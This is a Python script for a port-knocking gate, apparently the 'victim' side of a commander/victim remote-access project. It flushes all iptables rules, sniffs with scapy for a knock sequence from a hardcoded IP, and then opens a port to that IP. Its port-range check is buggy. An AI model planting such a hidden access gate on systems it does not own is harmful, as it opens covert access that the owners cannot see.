import ipaddress
import re
import subprocess
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sniff, send


def __flush_iptables_rules():
    """
    Flushes all current IPTable rules.
    @return: None
    """
    subprocess.run(["sudo", "iptables", "-F"])


def drop_traffic_to_port(src_port: int):
    """
    Configures the iptables to drop all inbound and outbound traffic
    to and from a specific port.

    @attention USE CASE
        Initially called when victim_main.py is executed

    @return: None
    """
    # Drop all inbound traffic to a specific port
    subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(src_port), "-j", "DROP"])


def accept_connection(ip_addr: str, port: int):
    """
    Opens up a port for a specific
    IP address after port knocking
    successful.

    @param ip_addr:
        The IP address to allow in

    @param port:
        The port number to open

    @return: None
    """
    __flush_iptables_rules()
    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-p', 'tcp', '-s',
                    ip_addr, '--dport', str(port), '-j', 'ACCEPT'])
    drop_traffic_to_port(port)


def get_IP_prompt():
    """
    Gets a user prompt for the IP address to trust/expect
    for port knocking.

    @return ip_address:
        A string containing the IP address of interest
    """

    while True:
        try:
            ip_address = input("[+] Enter an IP address to trust: ")
            ipaddress.ip_address(ip_address)
            return ip_address
        except ValueError as e:
            print("[+] INVALID IP ADDRESS FORMAT ERROR: An error has occurred - {}".format(e))


def __valid_port_sequence_pattern(port_sequence: str):
    pattern = r'^\d+(,\s*\d+)*$'
    return bool(re.match(pattern, port_sequence))


def __convert_port_sequence_list(port_sequence: list):
    formatted_port_sequence = []

    for port_num in port_sequence:
        formatted_port_num = int(port_num)

        if 0 <= formatted_port_num > 65535:
            raise ValueError("An invalid port number was provided (cannot be less than or equal "
                             "to 0 or greater than 65535)!")

        formatted_port_sequence.append(formatted_port_num)

    return formatted_port_sequence


def get_port_sequence_prompt():
    """
    Prompts and returns the user's port sequence.

    @return port_sequence:
        A list of port numbers
    """
    while True:
        try:
            # a) Get port sequence
            port_sequence = input("[+] Enter a port sequence in the following format (ex: 22, 80, 8888): ")

            # b) Check if the port sequence is valid
            if __valid_port_sequence_pattern(port_sequence):
                try:
                    return __convert_port_sequence_list(port_sequence.split(","))
                except ValueError as e:
                    print("[+] INVALID PORT NUMBER PROVIDED: {}".format(e))
            else:
                print("[+] GET PORT SEQUENCE ERROR: An invalid port sequence format was provided!")
                print("[+] Please try again...")
        except ValueError as e:
            print("[+] GET PORT SEQUENCE ERROR: An error has occurred - {}".format(e))


def validate_port_knocking(matching_ip_addr: str, port_sequence: list, source_port: int):
    """
    Performs the validation of the port knocking
    sequence.

    @param matching_ip_addr:
        The IP address of interest

    @param port_sequence:
        A list containing the port sequence

    @param source_port:
        The victim's own source port

    @return: None
    """
    counter = 0

    while True:
        has_failed = False

        for port_num in port_sequence:
            print("[+] PORT KNOCKING: Now expecting packet to port {}...".format(port_num))

            # a) If first sniff (no timeout until next one)
            # NOTE: The first sniff must be correct port otherwise commander will timeout
            if counter == 0:
                sniff(filter="src host {} and dst port {}".format(matching_ip_addr, port_num), count=1)
                print("[+] PORT CORRECT: Knock on port {} has been received...".format(port_num))
                counter += 1

            # b) Consecutive sniffs -> Set timeout of 5 seconds
            else:
                packet_list = sniff(filter="src host {} and dst port {}".format(matching_ip_addr, port_num),
                                    count=1, timeout=5)
                # Timeout handler
                if len(packet_list) == 0:
                    print("[+] PORT INCORRECT: A timeout has occurred while expecting a "
                          "knock on port {} within 3 second timeframe...".format(port_num))
                    packet = IP(dst=matching_ip_addr) / TCP(sport=source_port) / "REJECTED"
                    send(packet, verbose=0)
                    has_failed = True
                    break
                else:
                    print("[+] PORT CORRECT: Knock on port {} has been received...".format(port_num))

        # c) If correct port knocking sequence
        if has_failed is not True:
            print("[+] SEQUENCE CORRECT: Now allowing {} through port {}...".format(matching_ip_addr, source_port))
            accept_connection(matching_ip_addr, source_port)
            packet = IP(dst=matching_ip_addr) / TCP(sport=source_port) / "ACCEPTED"
            send(packet, verbose=0)
            break
        else:
            print("[+] Now re-sniffing for correct port knocking sequence...")
            counter = 0


if __name__ == '__main__':
    port_sequence = [431, 69, 6969]
    drop_traffic_to_port(22)
    validate_port_knocking("10.0.0.153", port_sequence, 69)
